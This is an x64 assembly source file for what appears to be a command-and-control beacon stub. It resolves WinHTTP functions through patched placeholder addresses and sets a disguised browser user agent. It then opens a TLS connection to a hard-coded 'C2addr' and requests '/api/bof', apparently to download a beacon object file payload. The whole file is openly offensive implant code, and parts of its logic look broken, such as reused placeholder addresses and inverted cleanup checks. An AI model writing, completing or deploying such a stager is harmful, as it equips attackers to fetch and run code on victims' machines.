[BITS 64]

StartBeacon :
    push rbp
    mov rbp, rsp
    
    push r12
    push r11
    push r10

    ; Stack Alignment and Allocation:
    ; push rbp (16), push r12 (8), push r11 (16), push r10 (8)
    ;   rsp is currently 8 mod 16.
    ; sub rsp, 48h (72 bytes) -> rsp % 16 == 0.
    ;   0x20 (Shadow) + 0x18 (Args 5,6,7) + 0x10 (Local variables/Alignment)
    sub rsp, 0x48

    xor r12, r12 ; hSession
    xor r11, r11 ; hConnect
    xor r10, r10 ; hRequest


; HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
;                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
;                                      WINHTTP_NO_PROXY_NAME, 
;                                      WINHTTP_NO_PROXY_BYPASS, 
;                                      WINHTTP_FLAG_ASYNC);

    lea rcx, [rel userAgent]
    mov rdx, 0  ; WINHTTP_ACCESS_TYPE_DEFAULT_PROXY
    mov r8, 0   ; WINHTTP_NO_PROXY_NAME
    mov r9, 0   ; WINHTTP_NO_PROXY_BYPASS
    mov qword [rsp+0x20], 0x10000000 ; WINHTTP_FLAG_ASYNC (Arg 5)

    call 0xAAAAAAAAAAAAAAAA ; GetProcAddr(WinHttpOpen)

    test rax, rax
    jz end

    mov r12, rax

; WinHttpSetStatusCallback(hSession, 
;                         (WINHTTP_STATUS_CALLBACK)IocpWakeupCallback, 
;                         WINHTTP_CALLBACK_FLAG_ALL_COMPLETIONS, 
;                         0);
    mov rcx, r12
    mov rdx, 0xBBBBBBBBBBBBBBBB ; IocpWakeupCallback
    mov r8, 0x10000000         ; WINHTTP_CALLBACK_FLAG_ALL_COMPLETIONS
    mov r9, 0                 ; 0

    call 0xCCCCCCCCCCCCCCCC ; GetProcAddr(WinHttpSetStatusCallback)

    test rax, rax
    jz end

; DWORD dwTlsOptions = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
; WinHttpSetOption(pCtx->hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &dwTlsOptions, sizeof(dwTlsOptions));

    ; Store the TLS configuration on the stack (Local Variable at rsp+0x40)
    mov dword [rsp+0x40], 0x00002800 ; 0x0800 | 0x2000

    mov rcx, r12
    mov rdx, 0x54 ; WINHTTP_OPTION_SECURE_PROTOCOLS
    lea r8, [rsp+0x40] ; Pointer to dwTlsOptions
    mov r9, 4          ; sizeof(DWORD)

    call 0xDDDDDDDDDDDDDDDD ; GetProcAddr(WinHttpSetOption)
    

; HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.1.100", 4321, 0);
    mov rcx, r12
    lea rdx, [rel C2addr]
    mov r8, 4321 ; Port
    mov r9, 0

    call 0xEEEEEEEEEEEEEEEE ; GetProcAddr(WinHttpConnect)

    test rax, rax
    jz end

    mov r10, rax

; HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/api/bof", 
;                                        NULL, WINHTTP_NO_REFERER, 
;                                        WINHTTP_DEFAULT_ACCEPT_TYPES, 
;                                        WINHTTP_FLAG_SECURE);

    mov rcx, r10 ; hConnect
    lea rdx, [rel MethodGet]
    lea r8, [rel PathApiBof]
    mov r9, 0       ; NULL
    mov qword [rsp+0x20], 0 ; WINHTTP_NO_REFERER (Arg 5)
    mov qword [rsp+0x28], 0 ; WINHTTP_DEFAULT_ACCEPT_TYPES (Arg 6)
    mov qword [rsp+0x30], 0x00800000 ; WINHTTP_FLAG_SECURE (Arg 7)

    call 0xFFFFFFFFFFFFFFFF ; GetProcAddr(WinHttpOpenRequest)

    test rax, rax
    jz end

    mov r11, rax

; WinHttpSetTimeouts(hRequest, 0, 60000, 30000, INFINITE);

    mov rcx, r11
    mov rdx, 0
    mov r8, 60000
    mov r9, 30000
    mov qword [rsp+0x20], 0xFFFFFFFF ; INFINITE (Arg 5)

    call 0xEEEEEEEEEEEEEEEE ; GetProcAddr(WinHttpSetTimeouts)

    test rax, rax
    jz end

; BOOL bResult = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, (DWORD_PTR)pCtx);

    mov rcx, r11
    mov rdx, 0 ; WINHTTP_NO_ADDITIONAL_HEADERS
    mov r8, 0  ; 0
    mov r9, 0  ; WINHTTP_NO_REQUEST_DATA

    mov qword [rsp+0x20], 0 ; 0 (Arg 5)
    mov qword [rsp+0x28], 0 ; 0 (Arg 6)
    mov qword [rsp+0x30], 0 ; (DWORD_PTR)pCtx (Arg 7)
    
    call 0xEEEEEEEEEEEEEEEE ; GetProcAddr(WinHttpSendRequest)

    test rax, rax


end : 
    test r12, r12
    jz free_session
    test r11, r11
    jz free_connect
    test r10, r10
    jz free_request
    jmp final
    
free_session:
    mov rcx, r12
    call qword [rel pWinHttpCloseHandle]
    jmp final

free_connect: 
    mov rcx, r11
    call qword [rel pWinHttpCloseHandle]
    jmp final

free_request:
    mov rcx, r10
    call qword [rel pWinHttpCloseHandle]
    jmp final

final:
    add rsp, 0x48 ; Clean up shadow space and local vars
    pop r10
    pop r11
    pop r12
    mov rsp, rbp
    pop rbp
    ret ; CRITICAL: Return execution to prevent fallthrough to data section

; Wide strings definition (UTF-16 LE) for WinHTTP
userAgent : 
    dw 'M','o','z','i','l','l','a','/','5','.','0',' ','(','W','i','n','d','o','w','s',' ','N','T',' ','1','0','.','0',';',' ','W','i','n','6','4',';',' ','x','6','4',')', 0

C2addr : 
    dw '1','9','2','.','1','6','8','.','1','.','1','0','0', 0

MethodGet :
    dw 'G','E','T', 0

PathApiBof :
    dw '/','a','p','i','/','b','o','f', 0

pWinHttpCloseHandle : 
    dq 0xABABABABABABABAB